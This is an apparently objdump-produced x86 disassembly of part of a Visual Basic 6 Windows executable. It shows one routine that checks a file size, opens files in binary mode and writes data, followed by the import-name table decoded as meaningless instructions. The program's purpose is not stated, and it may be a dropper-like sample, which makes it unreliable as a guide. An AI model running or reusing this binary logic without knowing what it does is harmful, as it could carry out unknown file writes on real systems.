  40373b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403741:	50                   	push   %eax
  403742:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403749:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  40374f:	53                   	push   %ebx
  403750:	56                   	push   %esi
  403751:	57                   	push   %edi
  403752:	89 65 f8             	mov    %esp,-0x8(%ebp)
  403755:	c7 45 fc f8 11 40 00 	movl   $0x4011f8,-0x4(%ebp)
  40375c:	8b 55 08             	mov    0x8(%ebp),%edx
  40375f:	33 c0                	xor    %eax,%eax
  403761:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403764:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403767:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40376a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40376d:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403770:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403773:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403776:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403779:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40377c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40377f:	89 45 bc             	mov    %eax,-0x44(%ebp)
  403782:	89 45 ac             	mov    %eax,-0x54(%ebp)
  403785:	89 45 9c             	mov    %eax,-0x64(%ebp)
  403788:	89 45 8c             	mov    %eax,-0x74(%ebp)
  40378b:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  403791:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  403797:	ff 15 ec 10 40 00    	call   *0x4010ec
  40379d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4037a0:	50                   	push   %eax
  4037a1:	ff 15 fc 10 40 00    	call   *0x4010fc
  4037a7:	3d 00 00 40 00       	cmp    $0x400000,%eax
  4037ac:	0f 8f 46 02 00 00    	jg     0x4039f8
  4037b2:	e8 09 fe ff ff       	call   0x4035c0
  4037b7:	8b 35 14 11 40 00    	mov    0x401114,%esi
  4037bd:	8b d0                	mov    %eax,%edx
  4037bf:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4037c2:	ff d6                	call   *%esi
  4037c4:	8b 3d dc 10 40 00    	mov    0x4010dc,%edi
  4037ca:	50                   	push   %eax
  4037cb:	6a 01                	push   $0x1
  4037cd:	6a ff                	push   $0xffffffff
  4037cf:	68 20 01 00 00       	push   $0x120
  4037d4:	ff d7                	call   *%edi
  4037d6:	8b 1d 28 11 40 00    	mov    0x401128,%ebx
  4037dc:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4037df:	ff d3                	call   *%ebx
  4037e1:	6a 00                	push   $0x0
  4037e3:	e8 d8 fd ff ff       	call   0x4035c0
  4037e8:	8b d0                	mov    %eax,%edx
  4037ea:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4037ed:	ff d6                	call   *%esi
  4037ef:	50                   	push   %eax
  4037f0:	ff 15 fc 10 40 00    	call   *0x4010fc
  4037f6:	83 e8 01             	sub    $0x1,%eax
  4037f9:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4037fc:	0f 80 68 02 00 00    	jo     0x403a6a
  403802:	50                   	push   %eax
  403803:	6a 01                	push   $0x1
  403805:	6a 11                	push   $0x11
  403807:	51                   	push   %ecx
  403808:	6a 01                	push   $0x1
  40380a:	68 80 00 00 00       	push   $0x80
  40380f:	ff 15 90 10 40 00    	call   *0x401090
  403815:	83 c4 1c             	add    $0x1c,%esp
  403818:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40381b:	ff d3                	call   *%ebx
  40381d:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  403820:	6a 01                	push   $0x1
  403822:	52                   	push   %edx
  403823:	68 c4 2b 40 00       	push   $0x402bc4
  403828:	ff 15 c0 10 40 00    	call   *0x4010c0
  40382e:	8b 1d 64 10 40 00    	mov    0x401064,%ebx
  403834:	6a 01                	push   $0x1
  403836:	ff d3                	call   *%ebx
  403838:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40383b:	50                   	push   %eax
  40383c:	6a 01                	push   $0x1
  40383e:	6a ff                	push   $0xffffffff
  403840:	68 20 01 00 00       	push   $0x120
  403845:	ff d7                	call   *%edi
  403847:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40384a:	6a 00                	push   $0x0
  40384c:	51                   	push   %ecx
  40384d:	ff 15 fc 10 40 00    	call   *0x4010fc
  403853:	83 e8 01             	sub    $0x1,%eax
  403856:	8d 55 ec             	lea    -0x14(%ebp),%edx
  403859:	0f 80 0b 02 00 00    	jo     0x403a6a
  40385f:	50                   	push   %eax
  403860:	6a 01                	push   $0x1
  403862:	6a 11                	push   $0x11
  403864:	52                   	push   %edx
  403865:	6a 01                	push   $0x1
  403867:	68 80 00 00 00       	push   $0x80
  40386c:	ff 15 90 10 40 00    	call   *0x401090
  403872:	83 c4 1c             	add    $0x1c,%esp
  403875:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403878:	6a 01                	push   $0x1
  40387a:	50                   	push   %eax
  40387b:	68 c4 2b 40 00       	push   $0x402bc4
  403880:	ff 15 c0 10 40 00    	call   *0x4010c0
  403886:	6a 01                	push   $0x1
  403888:	ff d3                	call   *%ebx
  40388a:	6a 00                	push   $0x0
  40388c:	8d 55 8c             	lea    -0x74(%ebp),%edx
  40388f:	6a 40                	push   $0x40
  403891:	8d 45 bc             	lea    -0x44(%ebp),%eax
  403894:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  403897:	52                   	push   %edx
  403898:	50                   	push   %eax
  403899:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  40389c:	c7 45 8c 11 60 00 00 	movl   $0x6011,-0x74(%ebp)
  4038a3:	ff 15 bc 10 40 00    	call   *0x4010bc
  4038a9:	c7 45 84 e0 2b 40 00 	movl   $0x402be0,-0x7c(%ebp)
  4038b0:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4038b3:	6a 01                	push   $0x1
  4038b5:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4038bb:	51                   	push   %ecx
  4038bc:	52                   	push   %edx
  4038bd:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4038c0:	6a 00                	push   $0x0
  4038c2:	50                   	push   %eax
  4038c3:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  4038ca:	00 00 00 
  4038cd:	c7 85 74 ff ff ff 00 	movl   $0x0,-0x8c(%ebp)
  4038d4:	00 00 00 
  4038d7:	c7 85 6c ff ff ff 02 	movl   $0x8002,-0x94(%ebp)
  4038de:	80 00 00 
  4038e1:	ff 15 b8 10 40 00    	call   *0x4010b8
  4038e7:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  4038ed:	50                   	push   %eax
  4038ee:	51                   	push   %ecx
  4038ef:	ff 15 00 10 40 00    	call   *0x401000
  4038f5:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
  4038fb:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4038fe:	8d 45 bc             	lea    -0x44(%ebp),%eax
  403901:	52                   	push   %edx
  403902:	50                   	push   %eax
  403903:	6a 02                	push   $0x2
  403905:	ff 15 20 10 40 00    	call   *0x401020
  40390b:	83 c4 0c             	add    $0xc,%esp
  40390e:	66 83 bd 68 ff ff ff 	cmpw   $0x0,-0x98(%ebp)
  403915:	00 
  403916:	0f 85 dc 00 00 00    	jne    0x4039f8
  40391c:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40391f:	51                   	push   %ecx
  403920:	6a 01                	push   $0x1
  403922:	6a ff                	push   $0xffffffff
  403924:	68 20 02 00 00       	push   $0x220
  403929:	ff d7                	call   *%edi
  40392b:	8b 3d 74 10 40 00    	mov    0x401074,%edi
  403931:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  403934:	6a 01                	push   $0x1
  403936:	52                   	push   %edx
  403937:	68 c4 2b 40 00       	push   $0x402bc4
  40393c:	ff d7                	call   *%edi
  40393e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403941:	6a 01                	push   $0x1
  403943:	50                   	push   %eax
  403944:	68 c4 2b 40 00       	push   $0x402bc4
  403949:	ff d7                	call   *%edi
  40394b:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40394e:	68 e0 2b 40 00       	push   $0x402be0
  403953:	51                   	push   %ecx
  403954:	6a 01                	push   $0x1
  403956:	ff 15 c4 10 40 00    	call   *0x4010c4
  40395c:	83 c0 01             	add    $0x1,%eax
  40395f:	0f 80 05 01 00 00    	jo     0x403a6a
  403965:	50                   	push   %eax
  403966:	ff 15 0c 10 40 00    	call   *0x40100c
  40396c:	8b d0                	mov    %eax,%edx
  40396e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403971:	ff d6                	call   *%esi
  403973:	8b 3d 30 10 40 00    	mov    0x401030,%edi
  403979:	50                   	push   %eax
  40397a:	ff d7                	call   *%edi
  40397c:	8b d0                	mov    %eax,%edx
  40397e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403981:	ff d6                	call   *%esi
  403983:	50                   	push   %eax
  403984:	68 f0 2b 40 00       	push   $0x402bf0
  403989:	ff d7                	call   *%edi
  40398b:	8b d0                	mov    %eax,%edx
  40398d:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403990:	ff d6                	call   *%esi
  403992:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403995:	50                   	push   %eax
  403996:	52                   	push   %edx
  403997:	6a 01                	push   $0x1
  403999:	ff 15 c4 10 40 00    	call   *0x4010c4
  40399f:	83 c0 01             	add    $0x1,%eax
  4039a2:	0f 80 c2 00 00 00    	jo     0x403a6a
  4039a8:	50                   	push   %eax
  4039a9:	ff 15 0c 10 40 00    	call   *0x40100c
  4039af:	8b d0                	mov    %eax,%edx
  4039b1:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4039b4:	ff d6                	call   *%esi
  4039b6:	50                   	push   %eax
  4039b7:	ff d7                	call   *%edi
  4039b9:	8b d0                	mov    %eax,%edx
  4039bb:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4039be:	ff d6                	call   *%esi
  4039c0:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4039c3:	6a 01                	push   $0x1
  4039c5:	50                   	push   %eax
  4039c6:	6a 00                	push   $0x0
  4039c8:	ff 15 1c 10 40 00    	call   *0x40101c
  4039ce:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4039d1:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4039d4:	51                   	push   %ecx
  4039d5:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4039d8:	52                   	push   %edx
  4039d9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4039dc:	50                   	push   %eax
  4039dd:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4039e0:	51                   	push   %ecx
  4039e1:	52                   	push   %edx
  4039e2:	6a 05                	push   $0x5
  4039e4:	ff 15 f0 10 40 00    	call   *0x4010f0
  4039ea:	83 c4 18             	add    $0x18,%esp
  4039ed:	6a 01                	push   $0x1
  4039ef:	ff d3                	call   *%ebx
  4039f1:	c7 45 e8 ff ff ff ff 	movl   $0xffffffff,-0x18(%ebp)
  4039f8:	68 53 3a 40 00       	push   $0x403a53
  4039fd:	eb 34                	jmp    0x403a33
  4039ff:	8d 45 cc             	lea    -0x34(%ebp),%eax
  403a02:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403a05:	50                   	push   %eax
  403a06:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403a09:	51                   	push   %ecx
  403a0a:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403a0d:	52                   	push   %edx
  403a0e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403a11:	50                   	push   %eax
  403a12:	51                   	push   %ecx
  403a13:	6a 05                	push   $0x5
  403a15:	ff 15 f0 10 40 00    	call   *0x4010f0
  403a1b:	8d 55 9c             	lea    -0x64(%ebp),%edx
  403a1e:	8d 45 ac             	lea    -0x54(%ebp),%eax
  403a21:	52                   	push   %edx
  403a22:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  403a25:	50                   	push   %eax
  403a26:	51                   	push   %ecx
  403a27:	6a 03                	push   $0x3
  403a29:	ff 15 20 10 40 00    	call   *0x401020
  403a2f:	83 c4 28             	add    $0x28,%esp
  403a32:	c3                   	ret
  403a33:	8b 35 44 10 40 00    	mov    0x401044,%esi
  403a39:	8d 55 ec             	lea    -0x14(%ebp),%edx
  403a3c:	52                   	push   %edx
  403a3d:	6a 00                	push   $0x0
  403a3f:	ff d6                	call   *%esi
  403a41:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403a44:	50                   	push   %eax
  403a45:	6a 00                	push   $0x0
  403a47:	ff d6                	call   *%esi
  403a49:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403a4c:	ff 15 28 11 40 00    	call   *0x401128
  403a52:	c3                   	ret
  403a53:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403a56:	66 8b 45 e8          	mov    -0x18(%ebp),%ax
  403a5a:	5f                   	pop    %edi
  403a5b:	5e                   	pop    %esi
  403a5c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403a63:	5b                   	pop    %ebx
  403a64:	8b e5                	mov    %ebp,%esp
  403a66:	5d                   	pop    %ebp
  403a67:	c2 04 00             	ret    $0x4
  403a6a:	ff 15 d8 10 40 00    	call   *0x4010d8
  403a70:	9e                   	sahf
  403a71:	9e                   	sahf
  403a72:	9e                   	sahf
  403a73:	9e                   	sahf
  403a74:	9c                   	pushf
  403a75:	3a 00                	cmp    (%eax),%al
  403a77:	00 ff                	add    %bh,%bh
  403a79:	ff                   	(bad)
  403a7a:	ff                   	(bad)
  403a7b:	ff                   	(bad)
  403a7c:	ff                   	(bad)
  403a7d:	ff                   	(bad)
  403a7e:	ff                   	(bad)
  403a7f:	ff d0                	call   *%eax
  403a81:	3b 00                	cmp    (%eax),%eax
  403a83:	00 00                	add    %al,(%eax)
  403a85:	10 00                	adc    %al,(%eax)
	...
  403a9b:	00 de                	add    %bl,%dh
  403a9d:	3b 00                	cmp    (%eax),%eax
  403a9f:	00 ee                	add    %ch,%dh
  403aa1:	3b 00                	cmp    (%eax),%eax
  403aa3:	00 f8                	add    %bh,%al
  403aa5:	3b 00                	cmp    (%eax),%eax
  403aa7:	00 06                	add    %al,(%esi)
  403aa9:	3c 00                	cmp    $0x0,%al
  403aab:	00 14 3c             	add    %dl,(%esp,%edi,1)
  403aae:	00 00                	add    %al,(%eax)
  403ab0:	24 3c                	and    $0x3c,%al
  403ab2:	00 00                	add    %al,(%eax)
  403ab4:	34 3c                	xor    $0x3c,%al
  403ab6:	00 00                	add    %al,(%eax)
  403ab8:	46                   	inc    %esi
  403ab9:	3c 00                	cmp    $0x0,%al
  403abb:	00 52 3c             	add    %dl,0x3c(%edx)
  403abe:	00 00                	add    %al,(%eax)
  403ac0:	66 3c 00             	data16 cmp $0x0,%al
  403ac3:	00 76 3c             	add    %dh,0x3c(%esi)
  403ac6:	00 00                	add    %al,(%eax)
  403ac8:	06                   	push   %es
  403ac9:	02 00                	add    (%eax),%al
  403acb:	80 84 3c 00 00 92 3c 	addb   $0x0,0x3c920000(%esp,%edi,1)
  403ad2:	00 
  403ad3:	00 a4 3c 00 00 ba 3c 	add    %ah,0x3cba0000(%esp,%edi,1)
  403ada:	00 00                	add    %al,(%eax)
  403adc:	d2 3c 00             	sarb   %cl,(%eax,%eax,1)
  403adf:	00 e2                	add    %ah,%dl
  403ae1:	3c 00                	cmp    $0x0,%al
  403ae3:	00 f6                	add    %dh,%dh
  403ae5:	3c 00                	cmp    $0x0,%al
  403ae7:	00 06                	add    %al,(%esi)
  403ae9:	3d 00 00 18 3d       	cmp    $0x3d180000,%eax
  403aee:	00 00                	add    %al,(%eax)
  403af0:	56                   	push   %esi
  403af1:	02 00                	add    (%eax),%al
  403af3:	80 2a 3d             	subb   $0x3d,(%edx)
  403af6:	00 00                	add    %al,(%eax)
  403af8:	78 02                	js     0x403afc
  403afa:	00 80 34 3d 00 00    	add    %al,0x3d34(%eax)
  403b00:	42                   	inc    %edx
  403b01:	3d 00 00 54 3d       	cmp    $0x3d540000,%eax
  403b06:	00 00                	add    %al,(%eax)
  403b08:	68 3d 00 00 84       	push   $0x8400003d
  403b0d:	3d 00 00 92 3d       	cmp    $0x3d920000,%eax
  403b12:	00 00                	add    %al,(%eax)
  403b14:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403b15:	3d 00 00 b4 3d       	cmp    $0x3db40000,%eax
  403b1a:	00 00                	add    %al,(%eax)
  403b1c:	c0 3d 00 00 d2 3d 00 	sarb   $0x0,0x3dd20000
  403b23:	00 e8                	add    %ch,%al
  403b25:	3d 00 00 f6 3d       	cmp    $0x3df60000,%eax
  403b2a:	00 00                	add    %al,(%eax)
  403b2c:	0e                   	push   %cs
  403b2d:	3e 00 00             	add    %al,%ds:(%eax)
  403b30:	1c 3e                	sbb    $0x3e,%al
  403b32:	00 00                	add    %al,(%eax)
  403b34:	32 3e                	xor    (%esi),%bh
  403b36:	00 00                	add    %al,(%eax)
  403b38:	3c 3e                	cmp    $0x3e,%al
  403b3a:	00 00                	add    %al,(%eax)
  403b3c:	58                   	pop    %eax
  403b3d:	3e 00 00             	add    %al,%ds:(%eax)
  403b40:	6e                   	outsb  %ds:(%esi),(%dx)
  403b41:	3e 00 00             	add    %al,%ds:(%eax)
  403b44:	82 3e 00             	cmpb   $0x0,(%esi)
  403b47:	00 90 3e 00 00 60    	add    %dl,0x6000003e(%eax)
  403b4d:	02 00                	add    (%eax),%al
  403b4f:	80 a2 3e 00 00 b6 3e 	andb   $0x3e,-0x49ffffc2(%edx)
  403b56:	00 00                	add    %al,(%eax)
  403b58:	cd 02                	int    $0x2
  403b5a:	00 80 c6 3e 00 00    	add    %al,0x3ec6(%eax)
  403b60:	d8 3e                	fdivrs (%esi)
  403b62:	00 00                	add    %al,(%eax)
  403b64:	e6 3e                	out    %al,$0x3e
  403b66:	00 00                	add    %al,(%eax)
  403b68:	f8                   	clc
  403b69:	3e 00 00             	add    %al,%ds:(%eax)
  403b6c:	85 02                	test   %eax,(%edx)
  403b6e:	00 80 06 3f 00 00    	add    %al,0x3f06(%eax)
  403b74:	10 3f                	adc    %bh,(%edi)
  403b76:	00 00                	add    %al,(%eax)
  403b78:	26 3f                	es aas
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	36 3f                	ss aas
  403b7e:	00 00                	add    %al,(%eax)
  403b80:	42                   	inc    %edx
  403b81:	3f                   	aas
  403b82:	00 00                	add    %al,(%eax)
  403b84:	54                   	push   %esp
  403b85:	3f                   	aas
  403b86:	00 00                	add    %al,(%eax)
  403b88:	66 3f                	data16 aas
  403b8a:	00 00                	add    %al,(%eax)
  403b8c:	76 3f                	jbe    0x403bcd
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	8a 3f                	mov    (%edi),%bh
  403b92:	00 00                	add    %al,(%eax)
  403b94:	9c                   	pushf
  403b95:	3f                   	aas
  403b96:	00 00                	add    %al,(%eax)
  403b98:	42                   	inc    %edx
  403b99:	02 00                	add    (%eax),%al
  403b9b:	80 64 00 00 80       	andb   $0x80,0x0(%eax,%eax,1)
  403ba0:	aa                   	stos   %al,%es:(%edi)
  403ba1:	3f                   	aas
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	43                   	inc    %ebx
  403ba5:	02 00                	add    (%eax),%al
  403ba7:	80 ba 3f 00 00 cc 3f 	cmpb   $0x3f,-0x33ffffc1(%edx)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	d6                   	salc
  403bb1:	3f                   	aas
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	6b 02 00             	imul   $0x0,(%edx),%eax
  403bb7:	80 e6 3f             	and    $0x3f,%dh
  403bba:	00 00                	add    %al,(%eax)
  403bbc:	f0 3f                	lock aas
  403bbe:	00 00                	add    %al,(%eax)
  403bc0:	fa                   	cli
  403bc1:	3f                   	aas
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	04 40                	add    $0x40,%al
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	14 40                	adc    $0x40,%al
  403bca:	00 00                	add    %al,(%eax)
  403bcc:	00 00                	add    %al,(%eax)
  403bce:	00 00                	add    %al,(%eax)
  403bd0:	4d                   	dec    %ebp
  403bd1:	53                   	push   %ebx
  403bd2:	56                   	push   %esi
  403bd3:	42                   	inc    %edx
  403bd4:	56                   	push   %esi
  403bd5:	4d                   	dec    %ebp
  403bd6:	36 30 2e             	xor    %ch,%ss:(%esi)
  403bd9:	44                   	inc    %esp
  403bda:	4c                   	dec    %esp
  403bdb:	4c                   	dec    %esp
  403bdc:	00 00                	add    %al,(%eax)
  403bde:	00 00                	add    %al,(%eax)
  403be0:	5f                   	pop    %edi
  403be1:	5f                   	pop    %edi
  403be2:	76 62                	jbe    0x403c46
  403be4:	61                   	popa
  403be5:	56                   	push   %esi
  403be6:	61                   	popa
  403be7:	72 54                	jb     0x403c3d
  403be9:	73 74                	jae    0x403c5f
  403beb:	47                   	inc    %edi
  403bec:	74 00                	je     0x403bee
  403bee:	00 00                	add    %al,(%eax)
  403bf0:	5f                   	pop    %edi
  403bf1:	43                   	inc    %ebx
  403bf2:	49                   	dec    %ecx
  403bf3:	63 6f 73             	arpl   %ebp,0x73(%edi)
  403bf6:	00 00                	add    %al,(%eax)
  403bf8:	00 00                	add    %al,(%eax)
  403bfa:	5f                   	pop    %edi
  403bfb:	61                   	popa
  403bfc:	64 6a 5f             	fs push $0x5f
  403bff:	66 70 74             	data16 jo 0x403c76
  403c02:	61                   	popa
  403c03:	6e                   	outsb  %ds:(%esi),(%dx)
  403c04:	00 00                	add    %al,(%eax)
  403c06:	00 00                	add    %al,(%eax)
  403c08:	5f                   	pop    %edi
  403c09:	5f                   	pop    %edi
  403c0a:	76 62                	jbe    0x403c6e
  403c0c:	61                   	popa
  403c0d:	53                   	push   %ebx
  403c0e:	74 72                	je     0x403c82
  403c10:	49                   	dec    %ecx
  403c11:	34 00                	xor    $0x0,%al
  403c13:	00 00                	add    %al,(%eax)
  403c15:	00 5f 5f             	add    %bl,0x5f(%edi)
  403c18:	76 62                	jbe    0x403c7c
  403c1a:	61                   	popa
  403c1b:	46                   	inc    %esi
  403c1c:	72 65                	jb     0x403c83
  403c1e:	65 56                	gs push %esi
  403c20:	61                   	popa
  403c21:	72 00                	jb     0x403c23
  403c23:	00 00                	add    %al,(%eax)
  403c25:	00 5f 5f             	add    %bl,0x5f(%edi)
  403c28:	76 62                	jbe    0x403c8c
  403c2a:	61                   	popa
  403c2b:	4c                   	dec    %esp
  403c2c:	65 6e                	outsb  %gs:(%esi),(%dx)
  403c2e:	42                   	inc    %edx
  403c2f:	73 74                	jae    0x403ca5
  403c31:	72 00                	jb     0x403c33
  403c33:	00 00                	add    %al,(%eax)
  403c35:	00 5f 5f             	add    %bl,0x5f(%edi)
  403c38:	76 62                	jbe    0x403c9c
  403c3a:	61                   	popa
  403c3b:	53                   	push   %ebx
  403c3c:	74 72                	je     0x403cb0
  403c3e:	56                   	push   %esi
  403c3f:	61                   	popa
  403c40:	72 4d                	jb     0x403c8f
  403c42:	6f                   	outsl  %ds:(%esi),(%dx)
  403c43:	76 65                	jbe    0x403caa
  403c45:	00 00                	add    %al,(%eax)
  403c47:	00 5f 5f             	add    %bl,0x5f(%edi)
  403c4a:	76 62                	jbe    0x403cae
  403c4c:	61                   	popa
  403c4d:	50                   	push   %eax
  403c4e:	75 74                	jne    0x403cc4
  403c50:	33 00                	xor    (%eax),%eax
  403c52:	00 00                	add    %al,(%eax)
  403c54:	5f                   	pop    %edi
  403c55:	5f                   	pop    %edi
  403c56:	76 62                	jbe    0x403cba
  403c58:	61                   	popa
  403c59:	46                   	inc    %esi
  403c5a:	72 65                	jb     0x403cc1
  403c5c:	65 56                	gs push %esi
  403c5e:	61                   	popa
  403c5f:	72 4c                	jb     0x403cad
  403c61:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  403c68:	5f                   	pop    %edi
  403c69:	61                   	popa
  403c6a:	64 6a 5f             	fs push $0x5f
  403c6d:	66 64 69 76 5f 6d 36 	imul   $0x366d,%fs:0x5f(%esi),%si
  403c74:	34 00                	xor    $0x0,%al
  403c76:	00 00                	add    %al,(%eax)
  403c78:	5f                   	pop    %edi
  403c79:	61                   	popa
  403c7a:	64 6a 5f             	fs push $0x5f
  403c7d:	66 70 72             	data16 jo 0x403cf2
  403c80:	65 6d                	gs insl (%dx),%es:(%edi)
  403c82:	31 00                	xor    %eax,(%eax)
  403c84:	00 00                	add    %al,(%eax)
  403c86:	5f                   	pop    %edi
  403c87:	5f                   	pop    %edi
  403c88:	76 62                	jbe    0x403cec
  403c8a:	61                   	popa
  403c8b:	53                   	push   %ebx
  403c8c:	74 72                	je     0x403d00
  403c8e:	43                   	inc    %ebx
  403c8f:	61                   	popa
  403c90:	74 00                	je     0x403c92
  403c92:	00 00                	add    %al,(%eax)
  403c94:	5f                   	pop    %edi
  403c95:	5f                   	pop    %edi
  403c96:	76 62                	jbe    0x403cfa
  403c98:	61                   	popa
  403c99:	4c                   	dec    %esp
  403c9a:	73 65                	jae    0x403d01
  403c9c:	74 46                	je     0x403ce4
  403c9e:	69 78 73 74 72 00 00 	imul   $0x7274,0x73(%eax),%edi
  403ca5:	00 5f 5f             	add    %bl,0x5f(%edi)
  403ca8:	76 62                	jbe    0x403d0c
  403caa:	61                   	popa
  403cab:	53                   	push   %ebx
  403cac:	65 74 53             	gs je  0x403d02
  403caf:	79 73                	jns    0x403d24
  403cb1:	74 65                	je     0x403d18
  403cb3:	6d                   	insl   (%dx),%es:(%edi)
  403cb4:	45                   	inc    %ebp
  403cb5:	72 72                	jb     0x403d29
  403cb7:	6f                   	outsl  %ds:(%esi),(%dx)
  403cb8:	72 00                	jb     0x403cba
  403cba:	00 00                	add    %al,(%eax)
  403cbc:	5f                   	pop    %edi
  403cbd:	5f                   	pop    %edi
  403cbe:	76 62                	jbe    0x403d22
  403cc0:	61                   	popa
  403cc1:	48                   	dec    %eax
  403cc2:	72 65                	jb     0x403d29
  403cc4:	73 75                	jae    0x403d3b
  403cc6:	6c                   	insb   (%dx),%es:(%edi)
  403cc7:	74 43                	je     0x403d0c
  403cc9:	68 65 63 6b 4f       	push   $0x4f6b6365
  403cce:	62 6a 00             	bound  %ebp,0x0(%edx)
  403cd1:	00 00                	add    %al,(%eax)
  403cd3:	00 5f 61             	add    %bl,0x61(%edi)
  403cd6:	64 6a 5f             	fs push $0x5f
  403cd9:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  403ce0:	32 00                	xor    (%eax),%al
  403ce2:	00 00                	add    %al,(%eax)
  403ce4:	5f                   	pop    %edi
  403ce5:	5f                   	pop    %edi
  403ce6:	76 62                	jbe    0x403d4a
  403ce8:	61                   	popa
  403ce9:	41                   	inc    %ecx
  403cea:	72 79                	jb     0x403d65
  403cec:	44                   	inc    %esp
  403ced:	65 73 74             	gs jae 0x403d64
  403cf0:	72 75                	jb     0x403d67
  403cf2:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  403cf6:	00 00                	add    %al,(%eax)
  403cf8:	5f                   	pop    %edi
  403cf9:	5f                   	pop    %edi
  403cfa:	76 62                	jbe    0x403d5e
  403cfc:	61                   	popa
  403cfd:	4f                   	dec    %edi
  403cfe:	6e                   	outsb  %ds:(%esi),(%dx)
  403cff:	45                   	inc    %ebp
  403d00:	72 72                	jb     0x403d74
  403d02:	6f                   	outsl  %ds:(%esi),(%dx)
  403d03:	72 00                	jb     0x403d05
  403d05:	00 00                	add    %al,(%eax)
  403d07:	00 5f 61             	add    %bl,0x61(%edi)
  403d0a:	64 6a 5f             	fs push $0x5f
  403d0d:	66 64 69 76 5f 6d 31 	imul   $0x316d,%fs:0x5f(%esi),%si
  403d14:	36 69 00 00 00 00 5f 	imul   $0x5f000000,%ss:(%eax),%eax
  403d1b:	61                   	popa
  403d1c:	64 6a 5f             	fs push $0x5f
  403d1f:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  403d26:	31 36                	xor    %esi,(%esi)
  403d28:	69 00 00 00 5f 43    	imul   $0x435f0000,(%eax),%eax
  403d2e:	49                   	dec    %ecx
  403d2f:	73 69                	jae    0x403d9a
  403d31:	6e                   	outsb  %ds:(%esi),(%dx)
  403d32:	00 00                	add    %al,(%eax)
  403d34:	00 00                	add    %al,(%eax)
  403d36:	5f                   	pop    %edi
  403d37:	5f                   	pop    %edi
  403d38:	76 62                	jbe    0x403d9c
  403d3a:	61                   	popa
  403d3b:	43                   	inc    %ebx
  403d3c:	68 6b 73 74 6b       	push   $0x6b74736b
  403d41:	00 00                	add    %al,(%eax)
  403d43:	00 5f 5f             	add    %bl,0x5f(%edi)
  403d46:	76 62                	jbe    0x403daa
  403d48:	61                   	popa
  403d49:	46                   	inc    %esi
  403d4a:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  403d51:	65 
  403d52:	00 00                	add    %al,(%eax)
  403d54:	00 00                	add    %al,(%eax)
  403d56:	45                   	inc    %ebp
  403d57:	56                   	push   %esi
  403d58:	45                   	inc    %ebp
  403d59:	4e                   	dec    %esi
  403d5a:	54                   	push   %esp
  403d5b:	5f                   	pop    %edi
  403d5c:	53                   	push   %ebx
  403d5d:	49                   	dec    %ecx
  403d5e:	4e                   	dec    %esi
  403d5f:	4b                   	dec    %ebx
